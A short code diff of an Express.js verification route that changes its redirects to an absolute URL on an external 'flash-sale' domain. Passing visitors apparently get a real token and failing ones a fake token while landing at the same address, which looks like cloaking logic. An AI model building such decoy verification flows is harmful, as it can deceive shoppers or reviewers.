@@ -178,10 +178,10 @@ app.post('/api/verify', async (req, res) => {
 
   if (result.pass) {
     console.log('[verify] PASS → redirect to flash-sale?token=REAL');
-    res.redirect(302, `/flash-sale?token=${result.token}`);
+    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
   } else {
     console.log(`[verify] FAIL (${result.reason}) → redirect to flash-sale?token=FAKE`);
-    res.redirect(302, `/flash-sale?token=${result.token}`);
+    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
   }
 });
 
